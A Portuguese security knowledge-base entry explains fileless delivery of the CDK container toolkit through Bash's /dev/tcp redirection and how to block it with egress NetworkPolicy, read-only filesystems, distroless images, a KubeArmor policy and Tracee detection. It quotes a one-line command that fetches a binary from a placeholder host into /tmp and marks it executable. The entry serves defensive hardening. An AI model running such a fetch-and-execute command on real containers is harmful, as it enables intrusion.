---
id: software.seguranca.tranche10.000989
tipo: tecnica
dominio: software
subdominio: seguranca
nivel: intermediario
confianca: media
ultima_verificacao: 2026-10-03
validade: volatil
status: candidata
revisao_humana: nao_solicitada
revisor: ""
revisao_ia: aprovada
revisor_ia: "Arena.ai Agent Mode"
data_revisao_ia: 2026-10-03
relatorio_revisao_ia: "knowledge-federation/exports/reports/ai-review-software-seguranca-2000-0003-tranche-10.md"
fontes: ["https://raw.githubusercontent.com/cdk-team/CDK/main/README.md", "https://raw.githubusercontent.com/cdk-team/CDK/main/go.mod"]
tags: [dominio/software, subdominio/seguranca, qualidade/candidata]
lote: software-seguranca-2000-0003
---

# Análise de Entrega *Fileless/In-Band* em Containers (`/dev/tcp`, `thin` builds) e Como **Bloquear na Camada de Runtime (`KubeArmor` / `Tracee`)**

## Em uma frase
A seção `Installation/Delivery` do `README.md` oficial do CDK documenta uma técnica clássica usada por pentesters quando um container vulnerável sofre RCE mas **não possui `curl`, `wget`, `scp` nem `nc` instalados**: usar o redirecionamento de socket virtual embutido no próprio shell **Bash (`/dev/tcp/<ip>/<porta>`)** (`cat < /dev/tcp/IP/PORT > /tmp/cdk && chmod +x /tmp/cdk`) para baixar a versão **`thin` (2 MB)** do binário!

## Por que importa
Compreender essa cadeia de ações (`bash` abrindo conexão TCP de saída -> escrevendo um arquivo ELF em `/tmp` ou `/dev/shm` -> chamando `fchmodat` `+x` -> chamando `execve` a partir de `/tmp`) permite ao arquiteto de segurança **quebrar todos os elos do ataque simultaneamente**!

## Como funciona
Veja os 4 controles defensivos que derrotam completamente o *drop-and-execute* em containers: **(1) NetworkPolicy de Egress (`Default Deny Egress`)** — impede que o Pod abra conexões TCP para IPs arbitrários na internet; **(2) `readOnlyRootFilesystem: true`** combinado com volumes `emptyDir` montados sem permissão de execução (`noexec`); **(3) Imagens sem `/bin/bash`** (usando imagens *distroless* sem shell!); e **(4) Regra KubeArmor / Tracee** bloqueando qualquer `execve` originado fora de `/usr/bin` ou `/app`!

## Exemplo
```yaml
# KubeArmorPolicy — Bloquear em nivel de kernel (LSM) a execucao de qualquer binario gravado em /tmp, /var/tmp ou /dev/shm!
apiVersion: security.kubearmor.com/v1
kind: KubeArmorPolicy
metadata:
  name: block-tmp-binary-execution
  namespace: production
spec:
  selector:
    matchLabels:
      tier: backend
  process:
    matchDirectories:
      - dir: /tmp/
        recursive: true
      - dir: /dev/shm/
        recursive: true
      - dir: /var/tmp/
        recursive: true
    action: Block
```

## Limites e trade-offs
Com a `KubeArmorPolicy` acima aplicada ao namespace `production`, mesmo que uma aplicação sofra uma vulnerabilidade crítica de RCE e um atacante consiga baixar o binário `cdk` para `/tmp/cdk`, a chamada de sistema `execve("/tmp/cdk")` é **negada instantaneamente pelo LSM no kernel (`EACCES`)** antes da primeira instrução rodar!

## Como verificar
Além disso, o **Tracee** possui a assinatura comportamental nativa `dropped_executable` que alerta o SOC sempre que um binário ELF novo é escrito e executado dentro de um container.

## Conexões
- [[cdk-auditoria-persistencia-kubernetes-daemonset-cronjob-shadow-apiserver]] — Veja também: Análise de Técnicas de **Persistência em Kubernetes** Mapeadas pelo CDK (`k8s-backdoor-daemonset`, `k8s-cronjob`, `k8s-shadow-apiserver` e `CVE-2020-8554`).
- [[cdk-compilacao-customizada-build-tags-perfis-avaliacao-red-team]] — Veja também: CDK: Perfis de Avaliação (**`--profile`**), Compilação Seletiva por **Go Build Tags (`thin`)** e Testes de Regressão de Hardening Kubernetes.
- [[cdk-arquitetura-container-penetration-toolkit-zero-dependency-evaluate]] — Referência cruzada direta com cdk-arquitetura-container-penetration-toolkit-zero-dependency-evaluate.

## Fontes
- [CDK Official GitHub — Zero-Dependency Container Penetration Toolkit (`evaluate`, `run` & `tool` Modules)](https://raw.githubusercontent.com/cdk-team/CDK/main/README.md) — documentação oficial do CDK cobrindo o avaliador `cdk evaluate`, módulos de escape (capabilities, cgroups, userns, docker.sock, runc, containerd-shim) e utilitários (`kcurl`, `ucurl`, `ectl`, `probe`); consultado em 2026-10-03.
- [CDK Official Go Module Specification (`go.mod`)](https://raw.githubusercontent.com/cdk-team/CDK/main/go.mod) — especificação oficial de pacotes Go do CDK (`containerd`, `gopsutil`, `tcell`, `golang.org/x/sys`); consultado em 2026-10-03.
